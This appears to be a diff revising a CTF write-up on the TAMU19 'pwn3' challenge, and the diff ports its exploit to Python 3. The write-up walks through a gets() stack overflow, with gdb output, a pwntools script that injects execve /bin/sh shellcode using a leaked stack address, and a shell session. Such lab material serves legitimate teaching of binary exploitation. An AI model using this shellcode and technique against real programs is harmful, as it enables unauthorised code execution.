@@ -3,9 +3,17 @@
 Let's take a look at the binary:
 
 ```
-$	file pwn3 
+$    file pwn3
 pwn3: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=6ea573b4a0896b428db719747b139e6458d440a0, not stripped
-$	./pwn3 
+$ pwn checksec pwn3
+[*] '/Hackery/nightmare/modules/06-bof_shellcode/tamu19_pwn3/pwn3'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+$    ./pwn3
 Take this, you might need it on your journey 0xffa1c61e!
 15935728
 ```
@@ -19,7 +27,7 @@ undefined4 main(void)
 
 {
   int iVar1;
-  
+ 
   iVar1 = __x86.get_pc_thunk.ax(&stack0x00000004);
   setvbuf((FILE *)(*(FILE **)(iVar1 + 0x19fd))->_flags,(char *)0x2,0,0);
   echo();
@@ -27,7 +35,23 @@ undefined4 main(void)
 }
 ```
 
-Looking through the main function, the most important thing here is that it calls the `echo` function. Let's take a look at that function in Ghidra:
+Looking through the main function, we see this:
+```
+/* WARNING: Function: __x86.get_pc_thunk.ax replaced with injection: get_pc_thunk_ax */
+
+undefined4 main(void)
+
+{
+  undefined *puVar1;
+ 
+  puVar1 = &stack0x00000004;
+  setvbuf(stdout,(char *)0x2,0,0);
+  echo(puVar1);
+  return 0;
+}
+```
+
+The most important thing here is that it calls the `echo` function. Let's take a look at that function in Ghidra:
 
 ```
 /* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
@@ -36,7 +60,7 @@ void echo(void)
 
 {
   char input [294];
-  
+ 
   printf("Take this, you might need it on your journey %p!\n",input);
   gets(input);
   return;
@@ -45,44 +69,44 @@ void echo(void)
 
 So we can see that this function prints the address of the char buffer `input`, then calls `gets` with `input` as an argument. This is a bug since `gets` doesn't restrict how much data it scans in, we get an overflow. With this we can overwrite the return address and get code execution. The question is now what do we call? There aren't any functions that will either print the flag or give us a shell like in some of the previous challenges. We will instead be using shellcode.
 
-Shellcode is essentially just precompiled code that we can inject into a binary's memory, and if we redirect code execution to it it will run. It will need to match the architecture, so we will need to have arm for x86 linux. Whenever I need just generic shellcode I typically grab it from http://shell-storm.org/shellcode/ (or you could just google for shellcode, or make it yourself which we will cover later). I'll be using the `Linux/x86 - execve /bin/sh shellcode - 23 bytes` shellcode by `Hamza Megahed` found at `http://shell-storm.org/shellcode/files/shellcode-827.php`. The shellcode I'm using will just pop a shell for us when we run it.
+Shellcode is essentially just precompiled code that we can inject into a binary's memory, and if we redirect code execution to it it will run. It will need to match the architecture, so we will need to have shellcode for x86 linux. Whenever I need just generic shellcode I typically grab it from http://shell-storm.org/shellcode/ (or you could just google for shellcode, or make it yourself which we will cover later). I'll be using the `Linux/x86 - execve /bin/sh shellcode - 23 bytes` shellcode by `Hamza Megahed` found at `http://shell-storm.org/shellcode/files/shellcode-827.php`. The shellcode I'm using will just pop a shell for us when we run it.
 
 Now we can inject it into memory, however we need to deal with something called ASLR (Address Space Layout Randomization). This is a binary mitigation (a mechanism made to make pwning harder). What it does is it randomizes all of the addresses for various memory regions, so every time the binary runs we don't know where things are in memory. While the addresses are random, the offsets between things in the same memory region remain the same. So if we just leak a single address from a memory region that we know what it is, since the offsets are the same we can figure out the address of anything else in the memory region.
 
-This also applies to where our shellocde is stored in memory, which we need to know in order to call it. Luckily for us, the address printed is the start of our input on the stack. So we can just take that address and overwrite the return address with it, to call our shellcode.
+This also applies to where our shellcode is stored in memory, which we need to know in order to call it. Luckily for us, the address printed is the start of our input on the stack. So we can just take that address and overwrite the return address with it, to call our shellcode.
 
 Let's use gdb to see how much space we have between the start of our input and the return address:
 
 ```
 gef➤  disas echo
 Dump of assembler code for function echo:
-   0x0000059d <+0>:	push   ebp
-   0x0000059e <+1>:	mov    ebp,esp
-   0x000005a0 <+3>:	push   ebx
-   0x000005a1 <+4>:	sub    esp,0x134
-   0x000005a7 <+10>:	call   0x4a0 <__x86.get_pc_thunk.bx>
-   0x000005ac <+15>:	add    ebx,0x1a20
-   0x000005b2 <+21>:	sub    esp,0x8
-   0x000005b5 <+24>:	lea    eax,[ebp-0x12a]
-   0x000005bb <+30>:	push   eax
-   0x000005bc <+31>:	lea    eax,[ebx-0x191c]
-   0x000005c2 <+37>:	push   eax
-   0x000005c3 <+38>:	call   0x410 <printf@plt>
-   0x000005c8 <+43>:	add    esp,0x10
-   0x000005cb <+46>:	sub    esp,0xc
-   0x000005ce <+49>:	lea    eax,[ebp-0x12a]
-   0x000005d4 <+55>:	push   eax
-   0x000005d5 <+56>:	call   0x420 <gets@plt>
-   0x000005da <+61>:	add    esp,0x10
-   0x000005dd <+64>:	nop
-   0x000005de <+65>:	mov    ebx,DWORD PTR [ebp-0x4]
-   0x000005e1 <+68>:	leave  
-   0x000005e2 <+69>:	ret    
+   0x0000059d <+0>:    push   ebp
+   0x0000059e <+1>:    mov    ebp,esp
+   0x000005a0 <+3>:    push   ebx
+   0x000005a1 <+4>:    sub    esp,0x134
+   0x000005a7 <+10>:    call   0x4a0 <__x86.get_pc_thunk.bx>
+   0x000005ac <+15>:    add    ebx,0x1a20
+   0x000005b2 <+21>:    sub    esp,0x8
+   0x000005b5 <+24>:    lea    eax,[ebp-0x12a]
+   0x000005bb <+30>:    push   eax
+   0x000005bc <+31>:    lea    eax,[ebx-0x191c]
+   0x000005c2 <+37>:    push   eax
+   0x000005c3 <+38>:    call   0x410 <printf@plt>
+   0x000005c8 <+43>:    add    esp,0x10
+   0x000005cb <+46>:    sub    esp,0xc
+   0x000005ce <+49>:    lea    eax,[ebp-0x12a]
+   0x000005d4 <+55>:    push   eax
+   0x000005d5 <+56>:    call   0x420 <gets@plt>
+   0x000005da <+61>:    add    esp,0x10
+   0x000005dd <+64>:    nop
+   0x000005de <+65>:    mov    ebx,DWORD PTR [ebp-0x4]
+   0x000005e1 <+68>:    leave  
+   0x000005e2 <+69>:    ret    
 End of assembler dump.
 gef➤  b *echo+61
 Breakpoint 1 at 0x5da
 gef➤  r
-Starting program: /Hackery/pod/modules/bof_shellcode/tamu19_pwn3/pwn3 
+Starting program: /Hackery/pod/modules/bof_shellcode/tamu19_pwn3/pwn3
 Take this, you might need it on your journey 0xffffcf3e!
 15935728
 [ Legend: Modified register | Code | Heap | Stack | String ]
@@ -97,9 +121,9 @@ $esi   : 0xf7faf000  →  0x001d7d6c ("l}"?)
 $edi   : 0x0       
 $eip   : 0x565555da  →  <echo+61> add esp, 0x10
 $eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
-$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
 ───────────────────────────────────────────────────────────────────── stack ────
-0xffffcf20│+0x0000: 0xffffcf3e  →  "15935728"	 ← $esp
+0xffffcf20│+0x0000: 0xffffcf3e  →  "15935728"     ← $esp
 0xffffcf24│+0x0004: 0xffffcf3e  →  "15935728"
 0xffffcf28│+0x0008: 0xffffcf4c  →  0x00000000
 0xffffcf2c│+0x000c: 0x565555ac  →  <echo+15> add ebx, 0x1a20
@@ -128,14 +152,14 @@ Breakpoint 1, 0x565555da in echo ()
 gef➤  search-pattern 15935728
 [+] Searching '15935728' in memory
 [+] In '[heap]'(0x56558000-0x5657a000), permission=rwx
-  0x56558160 - 0x56558168  →   "15935728" 
+  0x56558160 - 0x56558168  →   "15935728"
 [+] In '[stack]'(0xfffdd000-0xffffe000), permission=rwx
-  0xffffcf3e - 0xffffcf46  →   "15935728" 
+  0xffffcf3e - 0xffffcf46  →   "15935728"
 gef➤  info frame
 Stack level 0, frame at 0xffffd070:
  eip = 0x565555da in echo; saved eip = 0x5655561a
  called by frame at 0xffffd090
- Arglist at 0xffffd068, args: 
+ Arglist at 0xffffd068, args:
  Locals at 0xffffd068, Previous frame's sp is 0xffffd070
  Saved registers:
   ebx at 0xffffd064, ebp at 0xffffd068, eip at 0xffffd06c
@@ -156,21 +180,21 @@ from pwn import *
 target = process('./pwn3')
 
 # Print out the text, up to the address of the start of our input
-print target.recvuntil("journey ")
+print(target.recvuntil(b"journey "))
 
 # Scan in the rest of the line
 leak = target.recvline()
 
 # Strip away the characters not part of our address
-shellcodeAdr = int(leak.strip("!\n"), 16)
+shellcodeAdr = int(leak.strip(b"!\n"), 16)
 
 # Make the payload
-payload = ""
+payload = b""
 # Our shellcode from: http://shell-storm.org/shellcode/files/shellcode-827.php
-payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 # Pad the rest of the space to the return address with zeroes
-payload += "0"*(0x12e - len(payload))
-# Overwrite the return address with te leaked address which points to the start of our shellcode
+payload += b"0"*(0x12e - len(payload))
+# Overwrite the return address with the leaked address which points to the start of our shellcode
 payload += p32(shellcodeAdr)
 
 # Send the payload
@@ -182,16 +206,19 @@ target.interactive()
 
 When we run it:
 ```
-$	python exploit.py 
-[+] Starting local process './pwn3': pid 5149
-Take this, you might need it on your journey 
+$    python3 exploit.py
+[+] Starting local process './pwn3': pid 12060
+b'Take this, you might need it on your journey '
 [*] Switching to interactive mode
 $ w
- 19:33:06 up  2:19,  1 user,  load average: 0.01, 0.05, 0.07
+ 10:52:34 up  3:49,  1 user,  load average: 0.12, 0.23, 0.17
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-guyinatu tty7     :0               17:14    2:19m 40.15s  0.16s /sbin/upstart --user
+guyinatu :0       :0               07:08   ?xdm?   5:27   0.02s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --systemd --session=ubuntu
 $ ls
-exploit.py  pwn3
+exploit.py  pwn3  readme.md
+$
+[*] Interrupted
+[*] Stopped process './pwn3' (pid 12060)
 ```
 
 Just like that, we popped a shell!
